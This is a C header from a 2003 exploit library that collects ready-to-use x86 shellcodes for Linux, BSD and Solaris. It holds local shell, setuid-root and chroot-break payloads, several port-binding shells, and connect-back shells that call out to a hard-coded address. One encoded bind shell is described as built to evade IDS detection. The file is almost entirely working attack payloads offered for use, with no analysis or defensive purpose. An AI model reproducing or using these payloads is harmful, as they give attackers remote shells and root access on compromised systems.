/*
 *  IOCExpLib.h - by IOC - www.ioc.fr.st
 *  Version: IOCExpLib v1.0a Beta - 06/03
 *  File name: IOCEL_shellcodes.h 
 *  Description: includes shellcodes working on LINUX-BSDi-SOLARIS platforms
 *  Contact me - Li0n7@voila.fr
 *  Note: all these shellcodes are not mine, look at the note above
 *  each one to get their respective coder.
 */



#ifndef __IOCEL_SHELLCODES_H
#define __IOCEL_SHELLCODES_H







/* by ? */

char linux_long_sh[] =
      "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
      "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
      "\x80\xe8\xdc\xff\xff\xff/bin/sh";








/* by ? */

char linux_short_sh[]=
      "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3"
      "\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";








/* By Emper0r from IOC - http://www.ioc.fr.st */

char linux_bind_shell[] =
      "\x31\xc0\x99\xb0\x66\x52\x42\x52\x42\x52\x89\xe1\x6a\x01\x5b\xcd\x80\x89\xc7"
      "\x31\xd2\x52\x66\x68\x15\xb3\x43\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xb0"
      "\x66\xcd\x80\xb0\x66\xb3\x04\xcd\x80\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89"
      "\xd9\x89\xc3\x49\xb0\x3f\xcd\x80\x41\xe2\xf4\xb0\x0b\x51\x68\x6e\x2f\x73\x68"
      "\x68\x2f\x2f\x62\x69\x89\xe3\x51\x53\x89\xe1\xcd\x80";








/*	setuid(0) + chroot() break remote shellcode - 122 bytes (bindshell)
 *	by sd@cdi.cz, if you can make it _shorter_ than 122 bytes, please
 *	send me changes.
 */

static char linux_bind_chroot[] =
	"\x6a\x66\x58\x31\xdb\x53\x43\x53"
	"\x6a\x02\x89\xe1\xcd\x80\x43\x31"
	"\xc9\x51\xb5\x0a\x0f\xc9\x09\xd9" /* 0x0a * 256 = port 2560 */
	"\x51\x89\xe6\x6a\x10\x56\x50\x6a"
	"\x66\x58\x89\xe1\xcd\x80\xb0\x66"
	"\x43\x43\xcd\x80\x89\x64\x24\x08"
	"\xb0\x66\x43\xcd\x80\x93\x91\x6a"
	"\x3f\x58\xcd\x80\x49\x79\xf8\xb0"
	"\x17\x31\xdb\xcd\x80\x53\x68\x73"
	"\x64\x2e\x2e\x89\xe3\x41\xb1\xed"
	"\xb0\x27\xcd\x80\x6a\x3d\x58\x50"
	"\xcd\x80\x43\x43\xb0\x0c\xcd\x80"
	"\xe2\xfa\x58\xcd\x80\x51\x68\x6e"
	"\x2f\x73\x68\x68\x2f\x2f\x62\x69"
	"\x89\xe3\x51\x53\x89\xe1\xb0\x0b"
	"\xcd\x80";







/*
 *	Minimalistic "69" remote shellcode - 69 bytes (connect-back)
 *	(with nulls :), for applications such as ntpd exploit
 *	by sd@sf.cz, if you can make it _shorter_ than 69 bytes, please
 *	send me changes.
 */

static char linux_connect_back[] =
	"\x6a\x66\x58\x31\xdb\x53\x43\x53"
	"\x6a\x02\x89\xe1\xcd\x80\x68\x7f" /* 7f... ip addr */
	"\x00\x00\x01\x68\x02\x00\x0a\x00" /* 0a00 = port (2560) */
	"\x89\xe6\x6a\x10\x56\x50\x6a\x66"
	"\x58\x43\x43\x89\xe1\xcd\x80\x89"
	"\xd9\x5b\xb0\x3f\xcd\x80\x49\x79"
	"\xf9\x68\x2f\x73\x68\x00\x68\x2f"
	"\x62\x69\x6e\x89\xe3\x50\x53\x89"
	"\xe1\xb0\x0b\xcd\x80";









/*
 *	setuid(0) + execve() /bin/sh, 28 bytes
 *	by sd@cdi.cz, if you can make it _shorter_ than 28 bytes, please
 *	send me changes.
 *
 */

static char linux_setuid_sh[] =
	"\x6a\x17\x58\x31\xdb\xcd\x80\x53"
	"\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
	"\x62\x69\x89\xe3\x50\x53\x89\xe1"
	"\xb0\x0b\xcd\x80";









/*
 *	setuid(0) + chroot break + execve() /bin/sh, 61 bytes
 *	by sd@cdi.cz, if you can make it _shorter_ than 61 bytes, please
 *	send me changes.
 *
 */

static char linux_setuid_chroot_sh[] =
	"\x6a\x17\x58\x31\xdb\xcd\x80\x53"
	"\x89\xd9\x68\x73\x64\x2e\x2e\x89"
	"\xe3\xb1\xed\xb0\x27\xcd\x80\x6a"
	"\x3d\x58\x50\xcd\x80\x43\x43\xb0"
	"\x0c\xcd\x80\xe2\xfa\x58\xcd\x80"
	"\x51\x68\x6e\x2f\x73\x68\x68\x2f"
	"\x2f\x62\x69\x89\xe3\x51\x53\x89"
	"\xe1\xb0\x0b\xcd\x80";







/*
 *
 *  FreeBSD shellcode that binds /bin/sh to port 41254
 *  Assembly code and explanation will be released on safemode.org soon.
 *  Written by zillion (zillion at safemode.org)
 *
 */

static char fbsd_shell_binder[] =
        "\xeb\x64\x5e\x31\xc0\x88\x46\x07\x6a\x06\x6a\x01\x6a\x02\xb0"
        "\x61\x50\xcd\x80\x89\xc2\x31\xc0\xc6\x46\x09\x02\x66\xc7\x46"
        "\x0a\xa1\x26\x89\x46\x0c\x6a\x10\x8d\x46\x08\x50\x52\x31\xc0"
        "\xb0\x68\x50\xcd\x80\x6a\x01\x52\x31\xc0\xb0\x6a\x50\xcd\x80"
        "\x31\xc0\x50\x50\x52\xb0\x1e\x50\xcd\x80\xb1\x03\xbb\xff\xff"
        "\xff\xff\x89\xc2\x43\x53\x52\xb0\x5a\x50\xcd\x80\x80\xe9\x01"
        "\x75\xf3\x31\xc0\x50\x50\x56\xb0\x3b\x50\xcd\x80\xe8\x97\xff"
        "\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23";











/* 
 * Connecting back shellcode. In this case the connection is made to 
 * \x0a\x06\x0c\x21 which stands for 10.6.12.33:
 * perl -e 'printf "0x" . "%02x"x4 ."\n",10,6,12,33'
 * Written by zillion (safemode.org)
 *
 */

static char fbsd_connect_back[] =
        "\xeb\x52\x5e\x31\xc0\x88\x46\x07\x6a\x06\x6a\x01\x6a\x02\xb0"
        "\x61\x50\xcd\x80\x89\xc2\x31\xc0\xc6\x46\x08\x02\x66\xc7\x46"
        "\x09\xaa\xaa\xc7\x46\x0b\x0a\x06\x0c\x21\x6a\x10\x8d\x46\x07"
        "\x50\x52\x31\xc0\xb0\x62\x50\xcd\x80\xb1\x03\xbb\xff\xff\xff"
        "\xff\x43\x53\x52\xb0\x5a\x50\xcd\x80\x80\xe9\x01\x75\xf3\x31"
        "\xc0\x50\x50\x56\xb0\x3b\x50\xcd\x80\xe8\xa9\xff\xff\xff\x2f"
        "\x62\x69\x6e\x2f\x73\x68\x23";










/*
 * 
 * Shellcode and assembly code written by zillion (at safemode.org) for freebsd intel systems.. 
 * It does a simple execve of /bin/sh
 * This will be part of a shell code writing guide, which will be released on safemode.org soon.
 */

char fbsd_long_sh[] =
        "\xeb\x0e\x5e\x31\xc0\x88\x46\x07\x50\x50\x56\xb0\x3b\x50\xcd"
        "\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23";











/*
 *
 *FreeBSD shellcode that will bind /bin/sh to port 43690
 *
 *The shellcode has been encoded by using a simple method. The first
 *two lines are the decoder, which will translate the rest back to the
 *correct instructions.
 *
 *The advantages:
 *
 * - Less worries about trouble characters such as 0a
 * - Possible lower chance of IDS detection
 * - One will take more effort to reverse engineer the shellcode
 *
 *Written by zillion (safemode.org)  
 *
 */


static char fbsd_poly_bind[] =
        "\xeb\x11\x5e\x31\xc9\xb1\x72\x80\x6c\x0e\xff\x35\x80\xe9\x01"
        "\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff"
        "\x20\x99\x93\x66\xf5\xbd\x7b\x3c\x9f\x3b\x9f\x36\x9f\x37\xe5"
        "\x96\x85\x02\xb5\xbe\xf7\x66\xf5\xfb\x7b\x3e\x37\x9b\xfc\x7b"
        "\x3f\xdf\xdf\xbe\x7b\x43\x9f\x45\xc2\x7b\x3d\x85\x87\x66\xf5"
        "\xe5\x9d\x85\x02\xb5\x9f\x36\x87\x66\xf5\xe5\x9f\x85\x02\xb5"
        "\x66\xf5\x85\x85\x87\xe5\x53\x85\x02\xb5\xe6\x38\xf0\x34\x34"
        "\x34\x34\xbe\xf7\x78\x88\x87\xe5\x8f\x85\x02\xb5\xb5\x1e\x36"
        "\xaa\x28\x66\xf5\x85\x85\x8b\xe5\x70\x85\x02\xb5\x1d\xcc\x34"
        "\x34\x34\x64\x97\x9e\xa3\x64\xa8\x9d";












/* BSD x86 shellcode by eSDee of Netric (www.netric.org)
 * setuid(0,0); execve /bin/sh; exit();
 */



static char bsd_setuid_sh[] =

        // setuid(0,0);
        "\x31\xc0"                              // xor    %eax,%eax
        "\x50"                                  // push   %eax
	"\x50"					// push	  %eax
        "\x50"                                  // push   %eax
        "\xb0\x17"                              // mov    $0x17,%al
        "\xcd\x80"                              // int    $0x80

        // execve /bin/sh
        "\x31\xc0"                              // xor    %eax,%eax
        "\x50"                                  // push   %eax
        "\x68\x2f\x2f\x73\x68"                  // push   $0x68732f2f
        "\x68\x2f\x62\x69\x6e"                  // push   $0x6e69622f
        "\x89\xe3"                              // mov    %esp,%ebx
        "\x50"                                  // push   %eax
        "\x54"                                  // push   %esp
        "\x53"                                  // push   %ebx
        "\x50"                                  // push   %eax
        "\xb0\x3b"                              // mov    $0x3b,%al
        "\xcd\x80"                              // int    $0x80

        // exit
        "\x31\xc0"                              // xor    %eax,%eax
        "\xb0\x01"                              // mov    $0x1,%al
        "\xcd\x80";                             // int    $0x80












/* bind a shell on port 5555, for *BSD only, by emper0r - only 72 bytes !!@#8!! */

static char bsd_shell_binder[] =
"\x31\xc0\x99\x52\x42\x52\x42\x52\x50\xb0\x61\xcd\x80\x66\x68\x15\xb3\x66\x52"
"\x89\xe3\x6a\x10\x53\x50\x50\xb0\x68\xcd\x80\x5b\x50\x53\x50\xb0\x6a\xcd\x80"
"\xb0\x1e\xcd\x80\x52\x50\x52\xb0\x5a\xcd\x80\x4a\x79\xf6\x68\x6e\x2f\x73\x68"
"\x68\x2f\x2f\x62\x69\x89\xe3\x50\x54\x53\x53\xb0\x3b\xcd\x80";











/* BSD x86 shellcode by eSDee of Netric (www.netric.org)
 * 124 byte - connect back shellcode (port=0xb0ef)
 */


static char bsd_connect_back[] = 
	"\x31\xc0\x31\xdb\x53\xb3\x06\x53"
	"\xb3\x01\x53\xb3\x02\x53\x54\xb0"
	"\x61\xcd\x80\x31\xd2\x52\x52\x68"
	"\x41\x41\x41\x41\x66\x68\xb0\xef"
	"\xb7\x02\x66\x53\x89\xe1\xb2\x10"
	"\x52\x51\x50\x52\x89\xc2\x31\xc0"
	"\xb0\x62\xcd\x80\x31\xdb\x39\xc3"
	"\x74\x06\x31\xc0\xb0\x01\xcd\x80"
	"\x31\xc0\x50\x52\x50\xb0\x5a\xcd"
	"\x80\x31\xc0\x31\xdb\x43\x53\x52"
	"\x50\xb0\x5a\xcd\x80\x31\xc0\x43"
	"\x53\x52\x50\xb0\x5a\xcd\x80\x31"
	"\xc0\x50\x68\x2f\x2f\x73\x68\x68"
	"\x2f\x62\x69\x6e\x89\xe3\x50\x54"
	"\x53\x50\xb0\x3b\xcd\x80\x31\xc0"
	"\xb0\x01\xcd\x80";










/* 40 bytes execve /bin/sh shellcode - Solaris-x86
 * - by bighawk (bighawk@kryptology.org)
 *
 * Tested on: SunOS 5.7
 */

static char solaris_setuid_sh[] =

   "\x68\xff\xf8\xff\x3c"	// push   dword 03cfff8ffh
   "\xf7\x14\x24"		// not    dword [esp]
   "\x31\xc0"			// xor    eax, eax
   "\x99"			// cdq
   "\xb0\x9a"			// mov    al, 09ah
   "\x50"			// push   eax
   "\x89\xe5"			// mov    ebp, esp
   "\x52"			// push   edx
   "\x68\x2f\x2f\x73\x68"	// push   dword 68732f2fh
   "\x68\x2f\x62\x69\x6e"	// push   dword 6e69622fh
   "\x89\xe3"			// mov    ebx, esp
   "\x52"			// push   edx
   "\x53"			// push   ebx
   "\x89\xe1"			// mov    ecx, esp
   "\x52"			// push   edx
   "\x51"			// push   ecx
   "\x53"			// push   ebx
   "\xb0\x3b"			// mov    al, 59
   "\xff\xd5";			// call   ebp












/* 92 bytes  portbinding shellcode - Solaris-x86
 * - by bighawk (bighawk@kryptology.org)
 *
 * This shellcode binds /bin/sh on port 10000
 * Tested on: SunOS 5.7
 */

static char solaris_shell_binder[] =

   "\x31\xc9"			// xor	 ecx, ecx
   "\xf7\xe1"			// mul	 ecx
   "\x68\xff\xf8\xff\x3c"	// push  dword 03cfff8ffh
   "\xf7\x14\x24"		// not   dword [esp]
   "\xb0\x9a"			// mov   al, 09ah
   "\x50"			// push  eax
   "\x89\xe5"			// mov   ebp, esp
   "\x51"			// push	 ecx
   "\x41"			// inc	 ecx
   "\x41"			// inc	 ecx
   "\x51"			// push	 ecx
   "\x51"			// push	 ecx
   "\xb0\xe6"			// mov	 al, 230
   "\xff\xd5"			// call	 ebp
   "\x99"			// cdq
   "\x89\xc7"			// mov	 edi, eax
   "\x52"			// push  edx
   "\x66\x68\x27\x10"		// push	 word 4135
   "\x66\x51"			// push  cx
   "\x89\xe6"			// mov	 esi, esp
   "\x6a\x10"			// push  byte 16
   "\x56"			// push	 esi
   "\x57"			// push	 edi
   "\xb0\xe8"			// mov	 al, 232
   "\xff\xd5"			// call	 ebp
   "\xb0\xe9"			// mov	 al, 233
   "\xff\xd5"			// call  ebp
   "\x50"			// push	 eax
   "\x50"			// push	 eax
   "\x57"			// push	 edi
   "\xb0\xea"			// mov	 al, 234
   "\xff\xd5"			// call	 ebp
   "\x51"			// push  ecx
   "\x6a\x09"			// push  byte 9
   "\x50"			// push  eax
   "\xb0\x3e"			// mov   al, 62
   "\xff\xd5"			// call  ebp
   "\x49"			// dec   ecx
   "\x79\xf5"			// jns   lp
   "\x50"			// push  eax
   "\x68\x2f\x2f\x73\x68"	// push  dword 68732f2fh
   "\x68\x2f\x62\x69\x6e"	// push  dword 6e69622fh
   "\x89\xe3"			// mov   ebx, esp
   "\x50"			// push  eax
   "\x53"			// push  ebx
   "\x89\xe1"			// mov   ecx, esp
   "\x50"			// push  eax
   "\x51"			// push  ecx
   "\x53"			// push  ebx
   "\xb0\x3b"			// mov   al, 59
   "\xff\xd5";			// call  ebp




#endif



